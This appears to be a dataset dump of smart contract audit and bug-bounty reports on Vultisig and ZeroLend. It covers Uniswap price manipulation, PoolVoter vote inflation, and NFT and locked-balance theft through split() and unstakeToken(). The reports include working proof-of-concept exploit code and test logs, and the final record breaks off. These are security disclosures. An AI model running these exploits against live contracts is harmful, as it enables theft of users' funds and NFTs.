    deal(USDC, address(this), 1);
    int24 OUTSIDE_TICK = 0;
    IUniswapV3Pool(projectId).mint(address(this), OUTSIDE_TICK-10, OUTSIDE_TICK+10, 1, """");

    // Mitigation doesn't work now
    // You can uncomment the `expectRevert` and run the test with `-vvvv`
    // You'll see the log `ATTACKER::uniswapV3SwapCallback(0, 1, 0x)`, which means that it expects 1 wei of SALE_TOKEN
    // This is not possible as all SALE_TOKENs should be in the ILOPool at this moment
    console.log(""\n<<Failed mitigation attempt>>"");
    vm.expectRevert(bytes(""IIA""));
    IUniswapV3Pool(projectId).swap(address(this), false, 1, initialPrice, """");

    // The price will remain the one set by the attacker
    (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(projectId).slot0();
    assertEq(uint256(sqrtPriceX96), MIN_SQRT_RATIO);
}

function uniswapV3MintCallback(uint256, uint256, bytes memory) external {
    IERC20(USDC).transfer(projectId, IERC20(USDC).balanceOf(address(this)));
}

function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) external {
    assertGe(amount0, 0);
    assertGe(amount1, 0);

    console.log(""\nuniswapV3SwapCallback()"");
    console.log(""amount0 (USDC)      "", uint256(amount0));
    console.log(""amount1 (SALE_TOKEN)"", uint256(amount1));
}
```

</details>

### Recommended Mitigation Steps

Since the price can be manipulated, and single-sided liquidity can be minted, getting the price back to its initial price would require swapping and providing `SALE_TOKEN`. Since it's an initial sale with vesting for other participants, it is expected that no parties hold the token. But, even if they do, the attack can be performed at some cost anyway as explained before.

So one possible solution could be to reserve some amount in the ILO pool in case it needs to be swapped back, and perform a swap before the liquidity is added to the Uniswap Pool, taking into account an amount that would make the attack very expensive to rollback. Another approach could involve having a wrapper token around the `SALE_TOKEN` that can be minted and swapped to reach the expected price.

This is a potential first step. Additional considerations shall be taken into account, like an attacker minting liquidity on various tick ranges, which may also affect calculations.

### Assessed type

Uniswap

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/41#event-13596663998)**

***",Vultisig,0xc0ffEE|juancito|nnez|iam\_emptyset,HIGH,,41600,0,0,0,https://github.com/code-423n4/2024-06-vultisig-findings/issues/41,https://code4rena.com/reports/2024-06-vultisig,,https://code4rena.com/reports/2024-06-vultisig,solodit_reports,5f46e08fbfc497c16415797d1333365b,2024-08-09 01:58:03,2024-10-15 02:01:21,1,"(amount0, amount1) = addLiquidity(AddLiquidityParams({
```
        require(_cachedProject[uniV3PoolAddress].initialPoolPriceX96 == sqrtPriceX96, ""UV3P"");",
1866843,debf92daf19826cc1b3bf87d3ce4e15b,Votes manipulation in PoolVoter,Immunefi,2024-03-04,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description
## Vulnerability Details
**Affected asset**: https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol

`PoolVoter` contract allows to vote for the Gauge for anyone who has voting power by staking in the `VestedZeroNFT`.

The `vote()` function allows to specify pools associated with gauges and their respective weights.

```
function vote(
    address[] calldata _poolVote,
    uint256[] calldata _weights
) external {}
```

However, a crucial flaw exists as the function fails to check for repeated pools in the `_poolVote` array. Moreover, it only considers the last weight if the same pool is utilized, as seen here - https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L117.

```
if (_gauge != address(0x0)) {
    _updateFor(_gauge);
    _usedWeight += _poolWeight;
    totalWeight += _poolWeight;
    weights[_pool] += _poolWeight;
    poolVote[_who].push(_pool);
    votes[_who][_pool] = _poolWeight;  // !!!
}
```

When a voter calls the `reset()` function to retrieve their voting power back and vote for another gauge, only the last weight is taken into account in case of repeated pool voting.

As a result, the voter recovers the full voting power. Yet `totalWeight` and `weights[_pool]` are decreased only by the last element from the `_weights` array passed to the `vote()`.

```
uint256 _votes = votes[_who][_pool];

if (_votes > 0) {
    _updateFor(gauges[_pool]);
    totalWeight -= _votes;
    weights[_pool] -= _votes;
    votes[_who][_pool] = 0;
}
```

**Attack scenario**:
1. The attacker possesses a voting power of `19.01 ether`.
2. They invoke `vote()` to vote for the same gauge with the following parameters:
    - _poolVote = [gauge, gauge]
    - _weights = [19 ether, 1e8]
3.  Further they call `reset()`, but `weights[_pool]` and `totalWeight` are only decreased by `1e8`.
4. The attacker retains the full `19.01 ether` voting power. But `weights[_pool]` and `totalWeight` are now increased by `19 ether`.
5. By repeating steps 2-3 in a loop many times, the attacker can consolidate the majority of votes for their chosen gauge, and all rewards will be distributed to it.
6. By repeating steps 2-3 for **100** times, it's tantamount to having `1900 ether` voting power.


## Proof of Concept
To run the Poc put it's code to the `governance-main/test/PoolVoter.poc.ts` file, generate random private key, and issue the following command:

```
WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/PoolVoter.poc.ts --config hardhat.config.ts --network hardhat
```

```
import { expect } from ""chai"";
import { loadFixture } from ""@nomicfoundation/hardhat-network-helpers"";
import { SignerWithAddress } from ""@nomicfoundation/hardhat-ethers/signers"";
import {
  GaugeIncentiveController,
  OmnichainStaking,
  Pool,
  PoolVoter,
  StakingBonus,
  TestnetERC20,
  VestedZeroNFT,
  ZeroLend,
} from ""../typechain-types"";
import { e18 } from ""./fixtures/utils"";
import { deployVoters } from ""./fixtures/voters"";

// Put inside governance-main/test/PoolVoter.poc.ts

// Run as:
// WALLET_PRIVATE_KEY=0x... NODE_ENV=test npx hardhat test test/PoolVoter.poc.ts --config hardhat.config.ts --network hardhat

describe.only(""PoolVoter Immunefi Boost"", () => {
  let ant: SignerWithAddress;
  let now: number;
  let omniStaking: OmnichainStaking;
  let poolVoter: PoolVoter;
  let reserve: TestnetERC20;
  let stakingBonus: StakingBonus;
  let vest: VestedZeroNFT;
  let pool: Pool;
  let aTokenGauge: GaugeIncentiveController;
  let zero: ZeroLend;

  beforeEach(async () => {
    const deployment = await loadFixture(deployVoters);
    ant = deployment.ant;
    now = Math.floor(Date.now() / 1000);
    omniStaking = deployment.governance.omnichainStaking;
    poolVoter = deployment.poolVoter;
    reserve = deployment.lending.erc20;
    stakingBonus = deployment.governance.stakingBonus;
    vest = deployment.governance.vestedZeroNFT;
    zero = deployment.governance.zero;
    pool = deployment.lending.pool;
    aTokenGauge = deployment.aTokenGauge;

    // deployer should be able to mint a nft for another user
    await vest.mint(
      ant.address,
      e18 * 20n, // 20 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      true, // penalty -> false
      0
    );

    // stake nft on behalf of the ant
    await vest
      .connect(ant)
      [""safeTransferFrom(address,address,uint256)""](
        ant.address,
        stakingBonus.target,
        1
      );

    // there should now be some voting power for the user to play with
    // ant voting power is ~ 19 ether
    expect(await omniStaking.balanceOf(ant.address)).lessThan(e18 * 20n);
  });

  it(""ant fraudulently increases his voting power by 100x"", async function () {
    expect(await poolVoter.totalWeight()).eq(0);
    for (let i=0; i < 101; i++) {
      // Vote for the same pool 2 times but with different weights
      // 19 ether and 1e8 wei
      await poolVoter.connect(ant).vote(
        [reserve.target, reserve.target],
        [19n*e18, 1e8]
      );
      // Reset() call resets only 1e8 wei votes.
      // However, 19 ether votes remains untouched in totalWeight().
      // ant can has voting power of 19 ether again and again.
      // https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L67
      // https://github.com/zerolend/governance/blob/main/contracts/voter/PoolVoter.sol#L61-L63
      await poolVoter.connect(ant).reset();
    }
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n * 100n);
  });
});
```",ZeroLend,DuckAstronomer,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29012%20-%20%5bSC%20-%20High%5d%20Votes%20manipulation%20in%20PoolVoter.md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:22:32,2024-10-15 01:23:47,1,,
1866851,162b234bfb2a3fa455f0423a4f11a895,VestedZeroNFT tokens can be directly stolen through the split() function,Immunefi,2024-03-05,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description
## Brief/Intro
The split() function of VestedZeroNFT allows a user to split a tokenId to two tokens, using the desired ratio. 
VestedZeroNFT is a vesting solution, allowing anyone to mint a vesting token who will eventually emit the entire locked funds.


## Vulnerability Details
The `split()` function lacks access-control check - essentially that the msg.sender is the owner of `tokenID`. The `msg.sender` is the one receiving the newly minted token with an arbitrary ratio.
`_mint(msg.sender, ++lastTokenId);`
This means anyone can pass an existing tokenID and `fraction=1` to still 99.99% of the value of a token.

## Impact Details
Anyone can steal the underlying value of vestedZeroNFTs


## Proof of concept
Since the project's test suite does not run, as indicated in chat, I've prepped a POC as a standalone contract which directly copies the `split()` function from VestedZeroNFT.

Simply deploy the SplitStealPOC contract and run `attack()` which proves anyone can steal another person's holdings.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC165, ERC721Upgradeable, ERC721EnumerableUpgradeable} from ""@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721EnumerableUpgradeable.sol"";
import {IERC20} from ""@openzeppelin/contracts/interfaces/IERC20.sol"";
import {ERC20} from  ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";

interface IVestedZeroNFT{
    function split( uint256 tokenId, uint256 fraction) external;
    function mint( address _who, uint256 _pending, uint256 _upfront, uint256 _linearDuration, uint256 _cliffDuration, uint256 _unlockDate, bool _hasPenalty, VestCategory _category) external returns (uint256);
    function init(address _zero, address _stakingBonus) external;
}

enum VestCategory {
    PRIVATE_SALE,
    EARLY_ZERO,
    NORMAL,
    AIRDROP
}

struct LockDetails {
    uint256 cliffDuration;
    uint256 unlockDate;
    uint256 pendingClaimed;
    uint256 pending;
    uint256 upfrontClaimed;
    uint256 upfront;
    uint256 linearDuration;
    uint256 createdAt;
    bool hasPenalty;
    VestCategory category;
}

contract Zero is ERC20 {
    constructor() ERC20(""Zero"",""ZRO"") {
        _mint(msg.sender, 100_000 * 1e18);
    }
}

contract VestedZeroNFT is ERC721EnumerableUpgradeable {
    function init(address _zero, address _stakingBonus) external initializer {
    __ERC721_init(""ZeroLend Vest"", ""ZEROv"");
    denominator = 10000;
    zero = IERC20(_zero);
    }

    mapping(uint256 => bool) public frozen;
    uint256 public denominator;
    mapping(uint256 => LockDetails) public tokenIdToLockDetails;
    uint256 public lastTokenId;
    IERC20 public zero;

    function split(
        uint256 tokenId,
        uint256 fraction
    ) external {
        _requireOwned(tokenId);
        require(fraction > 0 && fraction < denominator, ""!fraction"");
        require(!frozen[tokenId], ""frozen"");
        LockDetails memory lock = tokenIdToLockDetails[tokenId];
        uint256 splitPendingAmount = (lock.pending * fraction) / denominator;
        uint256 splitUpfrontAmount = (lock.upfront * fraction) / denominator;
        uint256 splitUnlockedPendingAmount = (lock.pendingClaimed * fraction) /
            denominator;
        uint256 splitUnlockedUpfrontAmount = (lock.upfrontClaimed * fraction) /
            denominator;
        tokenIdToLockDetails[tokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: lock.createdAt,
            linearDuration: lock.linearDuration,
            pending: splitPendingAmount,
            pendingClaimed: splitUnlockedPendingAmount,
            upfrontClaimed: splitUnlockedUpfrontAmount,
            upfront: splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
        _mint(msg.sender, ++lastTokenId);
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: block.timestamp,
            linearDuration: lock.linearDuration,
            pending: lock.pending - splitPendingAmount,
            pendingClaimed: lock.pendingClaimed - splitUnlockedPendingAmount,
            upfrontClaimed: lock.upfrontClaimed - splitUnlockedUpfrontAmount,
            upfront: lock.upfront - splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
    }

    function getTokenIdToLockDetails(uint256 a) external returns (LockDetails memory)  {
        return tokenIdToLockDetails[a];
    }

    function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) {
        _mint(_who, ++lastTokenId);
        if (_unlockDate == 0) _unlockDate = block.timestamp;
        require(_unlockDate >= block.timestamp, ""invalid _unlockDate"");
        if (_hasPenalty) {
            require(_upfront == 0, ""no upfront when there is a penalty"");
            require(_cliffDuration == 0, ""no cliff when there is a penalty"");
        }
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: _cliffDuration,
            unlockDate: _unlockDate,
            pendingClaimed: 0,
            upfrontClaimed: 0,
            pending: _pending,
            hasPenalty: _hasPenalty,
            upfront: _upfront,
            linearDuration: _linearDuration,
            createdAt: block.timestamp,
            category: _category
        });
        // fund the contract
        zero.transferFrom(msg.sender, address(this), _pending + _upfront);
        return lastTokenId;
    }

}


contract SplitStealPOC {

    IERC20 zero;
    VestedZeroNFT nft;

    constructor() {
        zero = new Zero();
        nft = new VestedZeroNFT();
        nft.init(address(zero), address(0));        
    }

    function attack() external {
        zero.approve(address(nft), type(uint256).max);
        nft.mint(address(0x1111), 1000, 1000, 100, 100, block.timestamp, false, VestCategory.EARLY_ZERO); // uint256 _pending, uint256 _upfront, uint256 _linearDuration, uint256 _cliffDuration, uint256 _unlockDate, bool _hasPenalty, VestCategory _category) 

        require(nft.ownerOf(1) == address(0x1111));

        nft.split(1, 10);

        require(nft.ownerOf(2) == address(this));
        LockDetails memory l1 = nft.getTokenIdToLockDetails(1);
        LockDetails memory l2 = nft.getTokenIdToLockDetails(2);
        require(l1.pending == 1);
        require(l2.pending == 999);
    }
}

```",ZeroLend,Trust,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29031%20-%20%5bSC%20-%20Critical%5d%20VestedZeroNFT%20tokens%20can%20be%20directly%20stolen%20thr....md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:26:30,2024-10-15 01:26:33,1,,
1866854,9f1e3e724104dec45da5224186b5e754,Attacker can steal locked balance of staked nft at OmnichainStaking,Immunefi,2024-03-06,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description
## Brief/Intro
The OmnichainStaking's unstake function allows anyone to unstake any token by just burning associated voting power, since voting power is based on locked balance and lock duration so two different NFTS with different locked balances can have the same amount of power which allows an attacker to exchange an NFT with some locked balance for an NFT with more locked balance and shorter lock duration. 
The attacker can mint a tokenLocker NFT by locking some tokens for a long duration, stake it at OmnichainStaking to receive voting power, and use minted voting power to Unstake another NFT ( staked by another user ) with more locked balance and shorter lock duration from OmnichainStaking.
## Vulnerability Details
Users can utilize TokenLocker to create a lock by staking a certain amount of Zero tokens for a specified duration. TokenLocker then generates a unique NFT that represents the locked amount and the duration of the lock. Each NFT has a power value, calculated based on the locked amount and duration; more tokens and a longer lock duration contribute to a higher power. Users can stake these NFTs at OmnichainStaking contract and receive voting power proportional to the power of the TokenLocker NFT, OmnichainStaking has an unstakeToken function that allows anyone to unstake a token by burning the amount of voting power associated with that NFT.
users can receive the same amount of voting power by locking different amounts of Zero tokens due to different durations, this creates a situation that enables attackers to lock some amount of tokens for a long duration to receive voting power and use that voting power to unstake a tokenLocker NFT with more locked balance and lower lock duration.

Consider the following scenario : 
1 - Alice creates a lock with 40 Zero tokens for two years 
2 - Alice transfers minted NFT to omnichainStakign to receive voting power 
3 - Bob creates a lock with 20 Zero tokens for four years 
4 - Alice and Bob would receive the same amount of voting power ( both NFTs have the same power) 
5 - Bob Unstakes NFT of Alice from omniChainStaking ( he has enough voting power since both NFTs have minted the same voting power)
6 - Now Bob has an NFT representing 40 tokens locked for two years while he staked 20 tokens for 4 years. 
7 - Now Alice is forced to Unstake Bob's NFT which has 20 locked balances and has been locked for 4 years, he lost 20 tokens .

## Impact Details
Attackers can steal the locked balance of other users which is direct theft of funds. 
Also users can be forced to stake for a longer time.
## References
https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L147
https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L112-L116
https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L362-L364
https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/OmnichainStaking.sol#L68-L70
https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/OmnichainStaking.sol#L76-L79



## Proof of Concept
```
  describe(""attacker can drain staked amount of tokenLocker"", () => {
    it(""attacker can drain staked amount of tokenLocker"", async function () {

    // impoerted whale address from goverancne deployment 
    // imported time from hardhat-network-helpers 
    // transferred 20 zero token to whale and 40 zero token to ant address during deployment 
    // removed vesting part from beforeEach 

    let fourYearInSeconds = 124416000;
    let twoYearInSeconds = 62208000;

    // attacker (whale) has 20 Zero tokens
    let balanceOfAttackerBefore = await zero.balanceOf(whale);
    expect(balanceOfAttackerBefore).eq(20n * e18);
    
    // Victim (ant) creates a lock with 40 Zero tokens for duration of 2 years 
    // ant transferrs minted nft to OmnichainStaking and receives power 
    zero.connect(ant).approve(locker.target, 40n * e18);
    await locker.connect(ant).createLock(40n * e18, twoYearInSeconds, false);
    await locker.connect(ant)[""safeTransferFrom(address,address,uint256)""](ant.address, omniStaking.target, 1);

    // whale creates a lock with 20 Zero tokens but for duration of 4 years 
    // he transferrs minted nft to OmnichainStaking 
    // despite that he has locked half of ant address but due to more lock duration (2 times of ant) he would receive almost same amount of power 
    zero.connect(whale).approve(locker.target, 20n * e18);
    await locker.connect(whale).createLock(20n * e18, fourYearInSeconds, false);
    await locker.connect(whale)[""safeTransferFrom(address,address,uint256)""](whale.address, omniStaking.target, 2);

    // we can assert that whale has more power than ant 
    let balanceWhale = await omniStaking.balanceOf(whale.address);
    let balanceAnt = await omniStaking.balanceOf(ant.address);
    expect(balanceWhale).greaterThanOrEqual(balanceAnt);

    // whale can unstake minted nft of ant from tokenLocker since he has enough power 
    // this nft has two times more lockedBalance 
    await omniStaking.connect(whale).unstakeToken(1);

    // after 2 years he can withdraw this token from locker 
    // Now whale has 40 Zero token balance 
    // so ant address should use his voting power to other token with 20 Zero balance and 4 years of lock duration

    await time.increase(twoYearInSeconds);
    await locker.connect(whale).withdraw(1);
    let balanceOfAttacker = await zero.balanceOf(whale);
    expect(balanceOfAttacker).eq(40n * e18);


    });
    
  });
```",ZeroLend,MahdiKarimi,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29062%20-%20%5bSC%20-%20Critical%5d%20Attacker%20can%20steal%20locked%20balance%20of%20staked%20nft....md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:26:55,2024-10-15 01:26:53,1,,
1866860,527d669223659a4b835cdb0584a17234,Direct theft of User's VestedZeroNFT by using split function to mint a new NFT to take most fraction of the theft NFT of other users,Immunefi,2024-03-10,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description
# Description

Direct theft of User's VestedZeroNFT by using split function to mint a new NFT to take most fraction of the theft NFT of other users 


## Brief/Intro

VestedZeroNFT is a NFT based contract to hold all the user vests. NFTs can be traded on secondary marketplaces like Opensea, can be split into smaller chunks to allow for smaller otc deals to happen in secondary markets. 

When mint a NFT tokenIT for a user, the function mint() can be used 

https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L63-L72

```solidity
function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) 

```

The VestedZeroNFT has the split functionality to split a existed tokenID to mint a new tokenID 

https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L230-L273
```solidity
/// @inheritdoc IVestedZeroNFT
    function split(
        uint256 tokenId,
        uint256 fraction
    ) external whenNotPaused nonReentrant {
        _requireOwned(tokenId);
        require(fraction > 0 && fraction < denominator, ""!fraction"");
        require(!frozen[tokenId], ""frozen"");

        LockDetails memory lock = tokenIdToLockDetails[tokenId];

        uint256 splitPendingAmount = (lock.pending * fraction) / denominator;
        uint256 splitUpfrontAmount = (lock.upfront * fraction) / denominator;
        uint256 splitUnlockedPendingAmount = (lock.pendingClaimed * fraction) /
            denominator;
        uint256 splitUnlockedUpfrontAmount = (lock.upfrontClaimed * fraction) /
            denominator;

        tokenIdToLockDetails[tokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: lock.createdAt,
            linearDuration: lock.linearDuration,
            pending: splitPendingAmount,
            pendingClaimed: splitUnlockedPendingAmount,
            upfrontClaimed: splitUnlockedUpfrontAmount,
            upfront: splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });

        _mint(msg.sender, ++lastTokenId);
        tokenIdToLockDetails[lastTokenId] = LockDetails({
            cliffDuration: lock.cliffDuration,
            unlockDate: lock.unlockDate,
            createdAt: block.timestamp,
            linearDuration: lock.linearDuration,
            pending: lock.pending - splitPendingAmount,
            pendingClaimed: lock.pendingClaimed - splitUnlockedPendingAmount,
            upfrontClaimed: lock.upfrontClaimed - splitUnlockedUpfrontAmount,
            upfront: lock.upfront - splitUpfrontAmount,
            hasPenalty: lock.hasPenalty,
            category: lock.category
        });
    }
```
The intended purpose is that this allows the owner of the tokenID to split and mint a new tokenID from a fraction of the current tokenID. 

## Vulnerability Details

The vulnerability is this function does not check the msg.sender is the owner of the tokenID. 
The only check is:  
```solidity
 _requireOwned(tokenId); 
```

This check is from ERC721Upgradeable contract. 
https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L477-L483

```solidity 
/**
     * @dev Reverts if the `tokenId` doesn't have a current owner (it hasn't been minted, or it has been burned).
     * Returns the owner.
     *
     * Overrides to ownership logic should be done to {_ownerOf}.
     */
    function _requireOwned(uint256 tokenId) internal view returns (address) {
        address owner = _ownerOf(tokenId);
        if (owner == address(0)) {
            revert ERC721NonexistentToken(tokenId);
        }
        return owner;
    }
```

So the function just checks that the owner is not zero. 

So the attacker can use this function to steal most fraction of the VestedZeroNFT tokenID. 

The attacker can call 
```solidity
split(tokenID,1)
```
For the tokenID, the attacker can use any existed tokenID. 

The fraction is 1 to steal most of current tokenID to mint a new tokenID for the attacker. 

For example, if Ant has a tokenID for example = 2 that: 
pending = 10_000 * 10**18 

After the hack, 
The tokenID = 2 
pending = 1 * 10**18 

The hacker new minted tokenID has 

pending = 9999 * 10** 18 

So 99.99% amount of pending of Ant's tokenID was stolen by the attacker. 

The attacker can steal from tokenID of any owner, including the StakingBonus contract. 

# Impacts
# About the severity assessment

So the bug allow attackers to steal the VestedZeroNFT token of users.  
So the Severity is Critical with Category: Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties



# Proof of Concept

Test code POC: 
```typescript
it(""Direct theft of ZeroVestedNFT"", async function () {
    console.log(""Create the pre-condition setup for attack: User Ant has 1 VestedZeroNFT"");
    let lastTokenId = await vest.lastTokenId();
    console.log(""The address of the owner of the lastTokenId: "", await vest.ownerOf(lastTokenId));
    console.log(""The address of StakingBonus contract: "", stakingBonus.target.toString());

    console.log(""Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract""); 
    tokenId = await vest.mint(
      ant.address,
      e18 * 10000n, // 10000 ZERO linear vesting
      0, // 0 ZERO upfront
      1000, // linear duration - 1000 seconds
      0, // cliff duration - 0 seconds
      now + 1000, // unlock date
      false, // penalty -> false
      0
     );

    
    console.log(""Zero balance of Ant"", await zero.balanceOf(ant.address));
    console.log(""Zero balance of vestZeroNFT contract"", await zero.balanceOf(vest.target));
    lastTokenId = await vest.lastTokenId();
    console.log(""Ant address: "", ant.address);
    
    console.log(""The address of the owner of the TokenId: "", lastTokenId, await vest.ownerOf(lastTokenId));
    expect(await vest.ownerOf(lastTokenId)).eq(ant.address);
    
    console.log(""Get tokenIdToLockDetails of the lastTokenId"");
    let tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    console.log(""tokenIdToLockDetails: "", tokenIdToLockDetails); 
    
    /*-------------------------------------*/

    console.log(""Execute the attack to steal the amount of pending of the VestedZeroNFT to mint a new tokenID for the attacker"");
    const [attacker] = await hre.ethers.getSigners();
    console.log(""Attacker address: "", attacker.address);

    console.log(""Call split to theft the tokenID of Ant"");
    console.log(""LastTokenId: "", lastTokenId);
   
    await vest.connect(attacker).split(2,1) ;

    tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    expect(await vest.ownerOf(2)).eq(ant.address);

    console.log(""tokenIdToLockDetails: "", tokenIdToLockDetails); 

    lastTokenId = await vest.lastTokenId();
    console.log(""The owner address of the lastTokenId: "", await vest.ownerOf(lastTokenId));
    expect(await vest.ownerOf(lastTokenId)).eq(attacker.address);

    console.log(""Get tokenIdToLockDetails of the lastTokenId"");
    tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);
    console.log(""tokenIdToLockDetails: "", tokenIdToLockDetails); 

  });
```

In the above POC, to execute the attack, the hacker call the split function 


```typescript
await vest.connect(attacker).split(2,1) ;
```



Test log:  
Full Test Log:  https://drive.google.com/file/d/1uQI10CD-J9HB4KweMPAlMUj19OEzadk0/view?usp=sharing

```
Create the pre-condition setup for attack: User Ant has 1 VestedZeroNFT
The address of the owner of the lastTokenId:  0x9E545E3C0baAB3E08CdfD552C960A1050f373042
The address of StakingBonus contract:  0x9E545E3C0baAB3E08CdfD552C960A1050f373042
Mint a VestedZeroNFT for Ant by calling mint() function of VestedZeroNFT contract
Zero balance of Ant 0n
Zero balance of vestZeroNFT contract 10000000000000000000000n
Ant address:  0x70997970C51812dc3A010C7d01b50e0d17dc79C8
The address of the owner of the TokenId:  2n 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
Get tokenIdToLockDetails of the lastTokenId
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  10000000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
Execute the attack to steal the amount of pending of the VestedZeroNFT to mint a new tokenID for the attacker
Attacker address:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Call split to theft the tokenID of Ant
LastTokenId:  2n
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  1000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
The owner address of the lastTokenId:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Get tokenIdToLockDetails of the lastTokenId
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  9999000000000000000000n,
  0n,
  0n,
  1000n,
  1710064958n,
  false,
  0n
]
    ✔ Direct theft of ZeroVestedNFT (283ms)

```

Test Log explanation: 

So Pre-condition: Ant has 1 VestedZeroNFT with id = 2 
The tokenIdToLockDetails information for this tokenID 
```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  10000000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
```

This means pending = 10 000 * 10 **18 

After the attack, 
The tokenIdToLockDetails information for this tokenID 
```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  1000000000000000000n,
  0n,
  0n,
  1000n,
  1710064957n,
  false,
  0n
]
```
So the pending is 1 * 10 **18 


The attacker now has a tokenID = 3 with information 

```
tokenIdToLockDetails:  Result(10) [
  0n,
  1710065933n,
  0n,
  9999000000000000000000n,
  0n,
  0n,
  1000n,
  1710064958n,
  false,
  0n
]
```
The pending = 9999 * 10 ** 18 




To run the POC, 

Step 1: 
First clone the governance repository: 
```
git clone https://github.com/zerolend/governance.git
```

Step2: Apply Git patch file 

Bug5_diff.patch link: https://drive.google.com/file/d/1lsQmql7Bg4OAaSJJkK9_PD0Is1HyLqPV/view?usp=sharing



Apply the Patch by Git command using Git bash shell
```bash
git apply Bug5_diff_2.patch
```

Step 3: Input .env variables 

cd to folder governance, To run the test, you need to 
1. rename .env.example to .env 
2. put the test Private_key to the variable 

```
   WALLET_PRIVATE_KEY= 
   NODE_ENV == ""test"" 
```

Step 4: Install and run test 
Run command 

```
yarn install 
yarn test > test_all.log
```",ZeroLend,perseverance,HIGH,,,0,0,0,https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/ZeroLend/29204%20-%20%5bSC%20-%20Critical%5d%20Direct%20theft%20of%20Users%20VestedZeroNFT%20by%20using%20sp....md,,,https://immunefi.com/bounty/zerolend-boost/,solodit_reports,,2024-09-24 01:29:38,2024-10-15 01:30:22,1,,
1866866,3c378344563c49491dfde7657995d94f,all NFTs can be stolen by calling VestedZeroNFT::split(),Immunefi,2024-03-13,"Report type: Smart Contract


Target: https://github.com/zerolend/governance

Impacts:
- Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description
## Brief/Intro

